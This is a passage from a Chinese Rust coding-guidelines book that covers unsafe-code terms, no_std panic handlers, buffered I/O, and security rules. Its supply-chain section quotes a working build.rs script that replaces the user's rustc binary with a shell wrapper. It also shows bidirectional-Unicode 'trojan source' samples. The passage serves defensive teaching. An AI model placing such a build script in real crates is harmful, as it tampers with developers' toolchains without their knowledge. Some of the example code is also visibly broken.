<p>来自于：<a href="https://rust-lang.github.io/unsafe-code-guidelines/glossary.html">Unsafe Code Guidelines Reference | Glossary</a></p>
<table><thead><tr><th>术语</th><th>中文</th><th>意义</th></tr></thead><tbody>
<tr><td>Alias</td><td>别名</td><td>当一个指针或引用指向的内存范围（Span）和另一个指针或引用指向的内存区域重叠时，就会产生别名</td></tr>
<tr><td>(Pointer) Provenance</td><td>指针来源</td><td>用于区分指向相同内存地址的指针</td></tr>
<tr><td>Interior mutability</td><td>内部可变性</td><td>意味着一块可变的内存，同时还拥有一个共享引用，并且对其执行内部可变还不会引起 UB</td></tr>
<tr><td>Validity and safety invariant</td><td>有效性和安全性不变量</td><td>数据必须是有效的，但它只在安全的代码中才能保证安全</td></tr>
<tr><td>Undefined Behavior</td><td>未定义行为</td><td>最终程序在实际硬件上的表现与源程序根据Rust抽象机的表现不同</td></tr>
<tr><td>Soundness</td><td>健全性</td><td>意味着类型系统是正确的，健全性是类型良好的程序所需的属性</td></tr>
<tr><td>Layout</td><td>数据布局</td><td>用于定义类型的大小和对齐方式，以及它的子对象的偏移量</td></tr>
<tr><td>Zero-sized type / ZST</td><td>零大小类型</td><td>不占用空间的类型，即对齐要求为 <code>1</code> 的类型</td></tr>
<tr><td>Niche</td><td>利基</td><td>一个类型的利基决定了布局优化将使用的 无效位模式（bit-pattern）</td></tr>
<tr><td>Padding</td><td>填充</td><td>指编译器在结构体或枚举变体的字段之间填充空间，以满足对齐要求</td></tr>
<tr><td>Place</td><td>位置</td><td>位置是对位置表达式的求值结果（C 语言中叫&quot;左值，lvalue&quot;，C++中叫 &quot;广义左值，glvalue&quot;）</td></tr>
<tr><td>Value</td><td>值</td><td>值是对值表达式的求值结果 （其他语言叫 “右值，rvalue”）</td></tr>
<tr><td>Representation</td><td>表征</td><td>用于描述一个类型的值和内存中存储这个值的字节序列之间的关系</td></tr>
</tbody></table>
<p>​	</p>
<h2 id="别名alias"><a class="header" href="#别名alias">别名（Alias）</a></h2>
<p>当一个指针或引用指向的内存区域（Span）和另一个指针或引用指向的内存区域重叠时，就会产生别名。</p>
<p>对零大小类型（ZST）的引用和指针从不互相别名，因为它们的内存范围长度总是<code>0</code>字节。</p>
<p>【示例】</p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    let u: u64 = 7_u64;
    let r: &amp;u64 = &amp;u;
    let s: &amp;[u8] = unsafe {
        core::slice::from_raw_parts(&amp;u as *const u64 as *const u8, 8)
    };
    let (head, tail) = s.split_first().unwrap();
}
</code></pre></pre>
<p>该示例中，<code>r</code>  和 <code>s</code> 是互为别名，因为它们都指向 <code>u</code> 的内存。</p>
<p>然而，<code>head</code> 和 <code>tail</code> 不是互为别名，<code>head</code> 指向 <code>u</code>  的第一个字节，<code>tail</code> 指向其余字节。但是  <code>head</code> 和 <code>tail</code>  共同与 <code>s</code>  互为别名。</p>
<p>内存范围（Span）是指 引用或指针 指向值（Value）的大小，主要依赖于类型，按以下方式确定：</p>
<ol>
<li>对于一个是 <code>Sized</code> 的类型<code>T</code>，用 <code>size_of::&lt;T&gt;()</code> 可以获取 <code>T</code>的引用或指针的 内存范围长度。</li>
<li>当 <code>T</code>不是 <code>Sized</code> 时，就有点麻烦：
<ol>
<li>如果你有一个引用<code>r</code>，你可以使用<code>size_of_val(r)</code>来确定该引用的内存范围。</li>
<li>如果你有一个指针<code>p</code>，你必须在使用<code>size_of_val</code>之前不安全地(unsafely)将其转换为一个引用。目前还没有一个安全的方法来确定一个非<code>Sized</code>类型的指针的内存范围。</li>
</ol>
</li>
</ol>
<h2 id="指针来源pointer-provenance"><a class="header" href="#指针来源pointer-provenance">指针来源（(Pointer) Provenance）</a></h2>
<p>用于区分指向相同内存地址的指针，即，当强转为 <code>usize</code> 时，会比较是否相等。指针来源只存在于 Rust 的抽象层，在转译以后的二进制文件中，将无法区分指针来源，但是它可以影响编译器对程序的转译。</p>
<pre><pre class="playground"><code class="language-rust">
#![allow(unused)]
fn main() {
// 我们假设这里的两个分配的基本地址是 0x100 和 0x200
// 我们把指针的出处写成`@N`，其中`N`是某种唯一的ID，用来识别该分配
let raw1 = Box::into_raw(Box::new(13u8));
let raw2 = Box::into_raw(Box::new(42u8));
let raw2_wrong = raw1.wrapping_add(raw2.wrapping_sub(raw1 as usize) as usize);
// 这些指针现在有以下值:
//   raw1指向地址 0x100，其出处为 @1
//   raw2指向地址 0x200，并有出处 @2
//   raw2_wrong 指向地址 0x200，并有出处 @1
// 换句话说，raw2和raw2_wrong有相同的地址 
assert_eq!(raw2 as usize, raw2_wrong as usize);
// ...但是对 raw2_wrong 解引用将是不合法的，因为它有错误的来源（provenance）:
// 它指向地址 0x200，这是在分配 @2中，但这个指针的出处是 @1
}
</code></pre></pre>
<h2 id="内部可变性interior-mutability"><a class="header" href="#内部可变性interior-mutability">内部可变性（Interior mutability）</a></h2>
<p>意味着一块可变的内存，同时还拥有一个共享引用，并且对其执行内部可变还不会引起 UB。</p>
<p>如果由<code>&amp;T</code>或<code>&amp;mut T</code>立即指向的数据被改变，这就是内部可变。如果由<code>*const T</code>或<code>&amp;*const T</code>直接指向的数据被改变，就不是内部可变性。</p>
<p>Rust中所有的内部可变都必须发生在<code>UnsafeCell</code>内部，所以，所有具有内部可变性的数据结构都必须（直接或间接）使用<code>UnsafeCell</code>来实现这一目的。</p>
<h2 id="有效性安全不变性validity-and-safety-invariant"><a class="header" href="#有效性安全不变性validity-and-safety-invariant">有效性安全不变性（Validity and safety invariant）</a></h2>
<p>有效性（Validity）是指提供的数据必须与其对应类型一致，在其类型下必须有效。</p>
<p>安全性（safety）是指，可能引起 UB。</p>
<p>有效但不安全的一个示例是 <code>&amp;str</code> 或 <code>String</code> 类型。在 Unsafe Rust 下，可能会出现违反 UTF-8 编码的字符串，而 <code>&amp;str</code> 或 <code>String</code>  假设字符串都是合法的 UTF-8 编码，所以可能会出现 UB。</p>
<p>数据必须是有效的，但它只在安全的代码中才能保证安全。</p>
<h2 id="未定义行为-undefined-behavior"><a class="header" href="#未定义行为-undefined-behavior">未定义行为 （Undefined Behavior）</a></h2>
<p>程序员承诺，代码不会出现未定义行为。作为回报，编译器承诺以这样的方式编译代码：最终程序在实际硬件上的表现与源程序根据Rust抽象机的表现相同。如果发现程序确实有未定义的行为，那么程序员和编译器之间的契约就无效了，编译器将无法生成正确的程序（特别是，它不受任何规范的约束；程序甚至不一定是格式良好的可执行代码）。</p>
<p>未定义行为列表：</p>
<ul>
<li>数据竞争。</li>
<li>解引用悬空指针或者是未对齐指针</li>
<li>打破指针别名规则（引用生命周期不能长于其引用的对象，可变引用不能被别名）。</li>
<li>使用错误的 调用 ABI</li>
<li>执行使用当前执行线程不支持的目标特性（target features）编译的代码</li>
<li>产生无效的值
<ul>
<li>非<code>0</code>和 <code>1</code> 表达的 bool </li>
<li>具有无效判别式的 枚举</li>
<li>在 <code>[0x0, 0xD7FF] </code>和 <code>[0xE000, 0x10FFFF]</code> 范围之外的 字符</li>
<li>来自于未初始化内存的整数、浮点数、指针读取或字符串</li>
<li>悬垂引用或 Box</li>
<li>宽引用、Box 或 裸指针有无效的元数据
<ul>
<li><code>dyn Trait</code> 元数据是指向一个 Trait 的 vtable 的指针，且该Trait需要与指针或引用实际指向的动态trait相匹配，否则元数据无效</li>
<li>如果长度无效，则切片数据无效</li>
</ul>
</li>
<li>具有自定义无效值的类型，比如 <code>NonNull</code></li>
</ul>
</li>
</ul>
<p>参考：<a href="https://doc.rust-lang.org/nomicon/what-unsafe-does.html">Nomicon Rust</a></p>
<h2 id="健全性soundness"><a class="header" href="#健全性soundness">健全性（Soundness）</a></h2>
<p>健全性是一个类型系统的概念，意味着类型系统是正确的，即，类型良好的程序实际上应该具有该属性。对于 Rust 来说，意味着类型良好的程序不会导致未定义行为。但是这个承诺只适用于 Safe Rust。对于 Unsafe Rust要有开发者/程序员来维护这个契约。</p>
<p>因此，如果Safe 代码的公开 API 不可能导致未定义行为，就可以说这个库是健全的。反之，如果安全代码导致未定义行为，那么这个库就是不健全的。</p>
<h2 id="数据布局layout"><a class="header" href="#数据布局layout">数据布局（Layout）</a></h2>
<p>一个类型的布局定义了它的大小和对齐方式，以及它的子对象的偏移量（例如，结构体/联合体/枚举体/...的字段或数组的元素）。此外，一个类型的布局记录了它的函数调用ABI（或简称ABI）。</p>
<p>注意：最初，布局和表征（representation ）被视为同义词，Rust语言的特性，如<code>#[repr]</code>属性反映了这一点。在本文档中，布局和表征不是同义词。</p>
<h2 id="零大小类型zst"><a class="header" href="#零大小类型zst">零大小类型（ZST）</a></h2>
<p>零大小类型是指不会占用实际内存空间的类型，其对齐要求是 <code>1</code>。 比如 单元类型 <code>()</code> 的对齐要求就是 <code>1</code>，而 <code>[u16;0]</code> 的对齐要求就是 <code>2</code> 。</p>
<h2 id="利基niche"><a class="header" href="#利基niche">利基（Niche）</a></h2>
<p>一个类型的利基决定了其布局优化将使用的无效位模式。</p>
<p>比如， <code>Option&lt;Nonull&gt;</code> 具有和 <code>*mut T</code>相同的大小。</p>
<h2 id="填充padding"><a class="header" href="#填充padding">填充（Padding）</a></h2>
<p>指编译器在结构体或枚举变体的字段之间填充空间，以满足对齐要求。</p>
<p>填充可以被认为是 <code>[Pad; N] </code>，其中 <code>Pad</code>  大小假设为<code>1</code>，具有以下属性：</p>
<ol>
<li>对任何字节都有效。与<code> MaybeUninit&lt;u8&gt;</code>具有相同有效性。</li>
<li>复制 Pad 时忽略源字节，并向目标字节写入任何值。</li>
<li>复制 Pad 标记目标为未初始化。</li>
</ol>
<h2 id="位置place"><a class="header" href="#位置place">位置（Place）</a></h2>
<p>位置是 对 位置表达式的求值结果。在其他语言中，一般将其称为左值。</p>
<p>位置基本上是一个指针，但可能包含更多信息，比如 大小、 对齐方式等。</p>
<p>关于位置的关键操作：</p>
<ol>
<li>在其中存储相同类型的值（当它用于赋值的左侧时，let 绑定）</li>
<li>从它那里加载一个相同类型的值</li>
<li>使用 <code>&amp;</code>  或 <code>*</code> 操作符在一个位置（<code>T</code>）和一个指针值（<code>&amp;T</code> / <code>&amp;mut T</code>/ <code>*const T</code>/ 或 <code>*mut T</code> ）之间转换。</li>
</ol>
<h2 id="值value"><a class="header" href="#值value">值（Value）</a></h2>
<p>值是对值表达式的求值结果，或是被存储在某个地方的东西。 在其他语言中，一般将其称为右值。</p>
<h2 id="表征representation"><a class="header" href="#表征representation">表征（Representation）</a></h2>
<p>表征，用于描述一个类型的值和内存中存储这个值的字节序列之间的关系。</p>
<h2 id="ffi-safe"><a class="header" href="#ffi-safe">FFi-Safe:</a></h2>
<p>通过 FFi 外部传递的结构体类型都要满足内存布局的稳定性。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="320-no-std"><a class="header" href="#320-no-std">3.20 no-std</a></h1>
<p><code>no-std</code> 是指 被标示为 <code>#![no_std]</code> 的 crate，意味着该 crate 将链接到 <code>core</code> crate 而非 <code>std</code> crate。</p>
<p><code>no-std</code>  代表 裸机编程，嵌入式 Rust。</p>
<p>Rust 也有 <code>#![no_core]</code> 属性，但是还未稳定，不建议使用。</p>
<blockquote>
<p>参考数据： <code>core</code> 在编译后文件大小中只占大约 3k 大小。</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pemb01--no-std-下必须定义一个panic行为以确保安全"><a class="header" href="#pemb01--no-std-下必须定义一个panic行为以确保安全">P.EMB.01  <code>no-std</code> 下必须定义一个Panic行为以确保安全</a></h2>
<p><strong>【描述】</strong></p>
<p>鉴于<code>#![no_std]</code>应用程序没有标准输出，并且某些<code>#![no_std]</code>应用程序（例如嵌入式应用程序）需要不同的 Panic 行为来进行开发和发布。</p>
<p>因此，可以通过属性宏<code>#[panic_handler]</code>来定义 Panic 行为。</p>
<p><strong>【正例】</strong></p>
<p>定义 <code>panic-semihosting</code> Crate，将 Panic 消息记录到 Host 的 stderr :</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![no_std]

<span class="boring">fn main() {
</span>use core::fmt::{Write, self};
use core::panic::PanicInfo;

struct HStderr {
    // ..
}

#[panic_handler]
fn panic(info: &amp;PanicInfo) -&gt; ! {
    let mut host_stderr = HStderr::new();
    
    // logs &quot;panicked at '$reason', src/main.rs:27:4&quot; to the host stderr
    writeln!(host_stderr, &quot;{}&quot;, info).ok();

    loop {}
}
<span class="boring">}
</span></code></pre></pre>
<p>定义 <code>panic-halt</code> Crate，将 Panic 消息丢弃。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![no_std]
<span class="boring">fn main() {
</span>use core::panic::PanicInfo;

#[panic_handler]
fn panic(_info: &amp;PanicInfo) -&gt; ! {
    loop {}
}
<span class="boring">}
</span></code></pre></pre>
<p>在 <code>app</code> Crate 中， Debug 和 Release 编译模式调用不同的 Panic 行为。</p>
<pre><pre class="playground"><code class="language-rust">#![no_std]

// dev profile
#[cfg(debug_assertions)]
extern crate panic_semihosting;

// release profile
#[cfg(not(debug_assertions))]
extern crate panic_halt;

fn main() {
    // ..
}
</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pemb02--no-std-下要确保程序中的类型有正确的内存布局"><a class="header" href="#pemb02--no-std-下要确保程序中的类型有正确的内存布局">P.EMB.02  no-std 下要确保程序中的类型有正确的内存布局</a></h2>
<p><strong>【描述】</strong></p>
<p>链接器决定 no-std 程序的最终内存布局，但我们可以使用<a href="https://sourceware.org/binutils/docs/ld/Scripts.html">链接器脚本</a>对其进行一些控制。链接器脚本给我们的布局控制粒度是在 段（ Section） 级别。段是在连续内存中布置的 符号 集合。反过来，符号可以是数据（静态变量）或指令（Rust 函数）。</p>
<p>这些编译器生成的符号和段名称不能保证在 Rust 编译器的不同版本中保持不变。但是，Rust 允许我们通过以下属性控制符号名称和部分位置：</p>
<ul>
<li><code>#[export_name = &quot;foo&quot;]</code>将符号名称设置为 <code>foo</code>.</li>
<li><code>#[no_mangle]</code>意思是：使用函数或变量名（不是它的完整路径）作为它的符号名。 <code>#[no_mangle] fn bar()</code>将产生一个名为 <code>bar</code> 的符号。</li>
<li><code>#[link_section = &quot;.bar&quot;]</code>将符号放置在名为 <code>.bar</code> 的部分中。</li>
</ul>
<p>通过这些属性，我们可以公开程序的稳定 ABI 并在链接描述文件中使用它。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="321-io"><a class="header" href="#321-io">3.21 I/O</a></h1>
<p>在标准库中也提供了标准 I/O 类型，在 Safe Rust 下，I/O 操作是足够安全的，但是对于 原生句柄 (Raw Fd) 的操作，则属于不安全。</p>
<p>在 Unsafe Rust 下也有相关 I/O  的规范，请参加 <a href="safe-guides/coding_practice/./unsafe_rust/io.html">Unsafe Rust - I/O</a>   部分。</p>
<p>本部分只关注 Safe Rust 下 I/O 相关规范。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pfio01--使用-read_to_endread_to_string方法时注意文件的大小能否一次性读入内存中"><a class="header" href="#pfio01--使用-read_to_endread_to_string方法时注意文件的大小能否一次性读入内存中">P.FIO.01  使用 <code>read_to_end/read_to_string</code>方法时注意文件的大小能否一次性读入内存中</a></h2>
<p><strong>【描述】</strong></p>
<p>对于内存可以一次性读完的文件，可以使用 <code>read_to_end/read_to_string</code>之类的方法。但是如果你想读任意大小的文件，则不适合使用它们。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gfio01--文件读取建议使用-bufreaderbufwriter-来代替-readerwrite"><a class="header" href="#gfio01--文件读取建议使用-bufreaderbufwriter-来代替-readerwrite">G.FIO.01  文件读取建议使用 <code>BufReader/BufWriter</code> 来代替 <code>Reader/Write</code></a></h2>
<p><strong>【描述】</strong></p>
<p><code>BufReader/BufWriter</code> 使用缓冲区来减少 I/O 请求的次数，提升性能。访问磁盘一次读取 256 个字节显然比 访问磁盘256次每次一个字节 效率要更高。</p>
<p><strong>【示例】</strong></p>
<pre><pre class="playground"><code class="language-rust">use std::fs::File;
use std::io::{BufReader, Read};

fn main() {
    let mut data = String::new();
    let f = File::open(&quot;/etc/hosts&quot;).expect(&quot;Unable to open file&quot;);
    let mut br = BufReader::new(f);
    br.read_to_string(&amp;mut data).expect(&quot;Unable to read string&quot;);
    println!(&quot;{}&quot;, data);
}
</code></pre></pre>
<p>写 I/O：</p>
<pre><pre class="playground"><code class="language-rust">use std::fs::File;
use std::io::{BufWriter, Write};

fn main() {
    let data = &quot;Some data!&quot;;
    let f = File::create(&quot;/tmp/foo&quot;).expect(&quot;Unable to create file&quot;);
    let mut f = BufWriter::new(f);
    f.write_all(data.as_bytes()).expect(&quot;Unable to write data&quot;);
}
</code></pre></pre>
<p>逐行读： 注意返回的每行字符串都不含有换行字符。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::fs::File;
use std::io::{BufRead, BufReader};

pub fn scan() -&gt; Result&lt;(), io::Error&gt; {
    let mut file = BufReader::new(try!(File::open(&quot;foo.txt&quot;)));

    let mut line = String::new();
    while try!(file.read_line(&amp;mut line)) != 0 {
        if line.starts_with(&quot;x&quot;) {
            try!(file.seek(SeekFrom::Start(1000)));
        }
        do_stuff(&amp;line);
        line.clear();
    }

    Ok(())
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="322-security"><a class="header" href="#322-security">3.22 Security</a></h1>
<p>Security 用于规范可能引起信息安全（Security）缺陷的代码实现，而非功能安全（ Safety）类问题。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="psec01-使用第三方库的时候要确保可信的依赖小心供应链攻击"><a class="header" href="#psec01-使用第三方库的时候要确保可信的依赖小心供应链攻击">P.SEC.01 使用第三方库的时候要确保可信的依赖，小心供应链攻击</a></h2>
<p><strong>【描述】</strong></p>
<p>在 npm 中，node-ipc作者最近使用 npm 的安装脚本功能发起了 <a href="http://blog.nsfocus.net/node-ipc-npm/">供应链投毒攻击</a>。 在 Rust 中，<code>build.rs</code> 和 过程宏 有可能被利用来做同样的事。</p>
<p>目前 Rust 编译器团队已经在着手起草<a href="https://github.com/rust-lang/compiler-team/issues/475">构建时使用沙盒的方案</a>，但距离最终实现预计还有很长距离。</p>
<p>为了避免此类事件发生，可以遵循下列一些使用条款：</p>
<ul>
<li>尽量减少第三方库的依赖</li>
<li>如果必须使用第三方库，需要对依赖进行安全维护和检查。
<ul>
<li>为 <code>Cargo.toml</code> 中第三方依赖指定确切的版本（“=xyz”而不是“xyz”），如果需要更新版本，则在检查源码后手动应用次要的 SemVer 补丁。</li>
<li>可以使用<a href="https://github.com/mimoo/cargo-dephell"><code>cargo-dephell</code></a>这样的工具对依赖进行分析</li>
<li>配合<a href="https://github.com/diem/whackadep">whackadep</a>这样的可视化工具来管理 Rust 依赖</li>
</ul>
</li>
<li>使用 <a href="https://crates.io/crates/cargo-audit"><code>cargo-audit</code></a> 检测依赖的安全性。</li>
<li>使用自己的构建工具来替代 <code>Cargo</code>，可以更加安全。比如 Android 团队使用其<code>Soong</code>构建系统支持 Rust ，就选择禁用 <code>build.rs</code> ，就是考虑到审查起来太麻烦。</li>
<li>注意设置运行时进程权限，防止运行时代码投毒</li>
</ul>
<p><strong>【反例】</strong></p>
<p>下面是模拟 <code>build.rs</code> 投毒的示例：</p>
<pre><pre class="playground"><code class="language-rust">// From: https://github.com/Neutron3529/poisoning-rustc

use std::{io::Write,fs,env,path::Path};

fn main() -&gt; Result&lt;(),Box&lt;dyn std::error::Error&gt;&gt;{
    let cargo=env::var(&quot;CARGO&quot;)?;
    let cargo_dir=Path::new(&amp;cargo);
    let bin=cargo_dir.parent().ok_or(std::io::Error::new(std::io::ErrorKind::Other, &quot;no!&quot;))?;
    let rustc=env::var(&quot;RUSTC&quot;)?;
    let orc=&quot;old_&quot;.to_string()+&amp;rustc;
    let rcloc=bin.join(rustc);
    let ocloc=bin.join(orc);
    if !ocloc.exists() &amp;&amp; rcloc.exists(){
        fs::copy(&amp;rcloc,&amp;ocloc)?;// use copy to preserve 'x' permissions.
        let mut f=fs::File::create(rcloc)?;
        f.write_all(b&quot;#!/bin/sh\necho 'The rustc has been \&quot;poisoned\&quot; by poisoning crate, which suggests that, your computer is not strong enough to defend such attack' &gt; /tmp/rustc_infected\necho \&quot;If you're using Linux, your rustc perhaps works just fine\&quot; &gt;&gt; /tmp/rustc_infected\necho \&quot;but windows users may suffer from executing a linux-only script.\&quot; &gt;&gt; /tmp/rustc_infected\nexec &quot;)?;
        f.write_all(ocloc.to_str().ok_or(std::io::Error::new(std::io::ErrorKind::Other, &quot;oh no!&quot;))?.as_bytes())?;
        f.write_all(b&quot; $*&quot;)?
    }
    Ok(())
}
</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gsec01--代码中不要出现非法-unicode-字符也要防范非法-unicode-字符"><a class="header" href="#gsec01--代码中不要出现非法-unicode-字符也要防范非法-unicode-字符">G.SEC.01  代码中不要出现非法 Unicode 字符，也要防范非法 Unicode 字符</a></h2>
<p><strong>【级别】</strong> 要求</p>
<p><strong>【描述】</strong></p>
<p>非法 Unicode 字符可能引起安全问题。安全问题参见： <a href="https://blog.rust-lang.org/2021/11/01/cve-2021-42574.html">Rust 编译器安全公告（CVE-2021-42574）</a> </p>
<p>禁止的 Unicode 字符类别为：</p>
<ol>
<li>隐藏的 Unicode 字符</li>
<li>双向 Unicode 字符文本</li>
<li>同形 Unicode 字符</li>
</ol>
<p>Clippy Lint 目前只可以检测代码中出现的隐藏 Unicode 字符。</p>
<p>在 Rust 1.56.1 之后 新增两个 <code>lint</code> 拒绝代码中出现可以更改显示顺序的 <code>Unicode</code> 码点出现。并且特别禁止 <code>\u{202A}</code>，<code>\u{202B}</code>，<code>\u{202D}</code>，<code>\u{202E}</code>，<code>\u{2066}</code>， <code>\u{2067}</code>，<code>\u{2068}</code>，<code>\u{202C}</code> 和 <code>\u{2069}</code> 这几个特殊的 <code>Unicode</code> 码点。</p>
<p>Rust 的 <code>mixed_script_confusables</code> 和 <code>confusable_idents</code> 可以识别 同形字符。 </p>
<p>写代码的时候需要注意，尤其是开源代码，需要防范上述非法 Unicode 字符。</p>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">#![deny(text_direction_codepoint_in_comment)]
// 不符合
// 这段代码不应该输出里面的打印语句，但实际上输出了。
// 因为开发者看上去条件表达式里 确实等于 &quot;user&quot;，但实际上不等于&quot;user&quot;，因为这个字符串里被加了隐藏字符。
fn main() {
    let access_level = &quot;user&quot;;
    let access_level != &quot;user&quot; { // Check if admin
        println!(&quot;You are an admin&quot;);
    }
}

#![deny(text_direction_codepoint_in_literal)]
// 该文件包含双向Unicode文本，其解释或编译方式可能与下面的内容不同。 要审查，请在一个能显示隐藏的Unicode字符的编辑器中打开该文件。
// 执行输出
fn main() {
    let is_admin = false;
    /* begin admins only */ if is_admin {
        println!(&quot;You are an admin.&quot;);
    /* end admins only */ }
}
</code></pre></pre>
<p>或者</p>
<pre><pre class="playground"><code class="language-rust">#![deny(text_direction_codepoint_in_comment)]
fn main() {
    println!(&quot;{:?}&quot;); // '‮');
}

#![deny(text_direction_codepoint_in_literal)]
fn main() {
    println!(&quot;{:?}&quot;, '‮');
}
</code></pre></pre>
<p><strong>【例外】</strong></p>
<p>但也有例外，比如你的代码恰好是要处理这些特殊Unicode字符的。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// From: https://docs.rs/crate/lingo/0.1.2/source/src/generated.rs
#[allow(clippy::invisible_characters)]
pub fn get_embed_languages() -&gt; FileContent {
    let mut f = FileContent::from_vec(vec![
        (
            Language::Afrikaans.name(),
            vec![
                &quot;e&quot;, &quot;a&quot;, &quot;i&quot;, &quot;n&quot;, &quot;s&quot;, &quot;r&quot;, &quot;o&quot;, &quot;t&quot;, &quot;d&quot;, &quot;e_&quot;, &quot;l&quot;, &quot;k&quot;, &quot;g&quot;, &quot;ie&quot;, &quot;n_&quot;,
                // 省略很多字符，包括特殊的隐藏 unicode 字符
            ]
        )
    )
 }
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#invisible_characters"><code>invisible_characters</code></a></td><td>yes</td><td>no</td><td>correctness</td><td>deny</td></tr>
<tr><td><a href="https://doc.rust-lang.org/rustc/lints/listing/deny-by-default.html#text-direction-codepoint-in-comment"><code>text-direction-codepoint-in-comment</code></a></td><td>no</td><td>yes</td><td>-</td><td>deny</td></tr>
<tr><td><a href="https://doc.rust-lang.org/rustc/lints/listing/deny-by-default.html#text-direction-codepoint-in-literal"><code>text_direction_codepoint_in_literal</code></a></td><td>no</td><td>yes</td><td>-</td><td>deny</td></tr>
<tr><td><a href="https://doc.rust-lang.org/rustc/lints/listing/warn-by-default.html#confusable-idents"><code>confusable_idents</code></a></td><td>no</td><td>yes</td><td>-</td><td>warn</td></tr>
<tr><td><a href="https://doc.rust-lang.org/rustc/lints/listing/warn-by-default.html#mixed-script-confusables"><code>mixed_script_confusables</code></a></td><td>no</td><td>yes</td><td>-</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h1 id="323-其他"><a class="header" href="#323-其他">3.23 其他</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h2 id="goth01--对于某些场景下不建议使用的方法可以通过配置-clippytoml-来拒绝"><a class="header" href="#goth01--对于某些场景下不建议使用的方法可以通过配置-clippytoml-来拒绝">G.OTH.01  对于某些场景下不建议使用的方法可以通过配置 <code>clippy.toml</code> 来拒绝</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>有些场合可能需要拒绝使用一些容易出错的方法或函数，可以在 <code>clippy.toml</code> 中通过配置 <code>disallowed_method</code> 来满足这个需求。</p>
<pre><code class="language-toml"># clippy.toml
disallowed-methods = [
    # Can use a string as the path of the disallowed method.
    &quot;std::boxed::Box::new&quot;,
    # Can also use an inline table with a `path` key.
    { path = &quot;std::time::Instant::now&quot; },
    # When using an inline table, can add a `reason` for why the method
    # is disallowed.
    { path = &quot;std::vec::Vec::leak&quot;, reason = &quot;no leaking memory&quot; },
]

# 允许 Lint 支持配置值对应的本地语言
# 配置时候从该列表获取别名 https://www.unicode.org/iso15924/iso15924-codes.html
allowed-locales = [&quot;Latin&quot;, &quot;Cyrillic&quot;] 
</code></pre>
<p><strong>【反例】</strong></p>
<p>当 <code>clippy.toml</code> 做了上面配置时，下面代码会曝出警告。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::disallowed_method, clippy::disallowed_script_idents, clippy::disallowed_type)]
<span class="boring">fn main() {
</span>// 不符合
let xs = vec![1, 2, 3, 4];
xs.leak(); // Vec::leak 被配置为不允许
let _now = Instant::now(); // Instant::now 被配置为不允许

let _box = Box::new(3); // Box::new 被配置为不允许
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::disallowed_method, clippy::disallowed_script_idents, clippy::disallowed_type)]

<span class="boring">fn main() {
</span>// 符合
let mut xs = Vec::new(); // Vec::new is _not_ disallowed in the
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#disallowed_method">disallowed_method</a></td><td>yes</td><td>no</td><td>nursery</td><td>allow</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#disallowed_script_idents">disallowed_script_idents</a></td><td>yes</td><td>no</td><td><strong>restriction</strong></td><td>allow</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#disallowed_type">disallowed_type</a></td><td>yes</td><td>no</td><td><strong>nursery</strong></td><td>allow</td></tr>
</tbody></table>
<p>这些 lint 作用相似，但注意 <code>nursery</code> 的lint 还未稳定。 </p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="goth02--使用标准库中对应的方法计算秒级毫秒级微秒级的时间"><a class="header" href="#goth02--使用标准库中对应的方法计算秒级毫秒级微秒级的时间">G.OTH.02  使用标准库中对应的方法计算秒级、毫秒级、微秒级的时间</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>略。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span><span class="boring">use std::time::Duration;
</span>let dur = Duration::new(5, 0);

// Bad
let _micros = dur.subsec_nanos() / 1_000;      // 不符合：用纳秒计算微秒
let _millis = dur.subsec_nanos() / 1_000_000;  // 不符合：用纳秒计算毫秒
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span><span class="boring">use std::time::Duration;
</span>let dur = Duration::new(5, 0);

// Good
let _micros = dur.subsec_micros(); // 符合：通过标准库函数得到微秒
let _millis = dur.subsec_millis(); // 符合：通过标准库函数得到毫秒
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
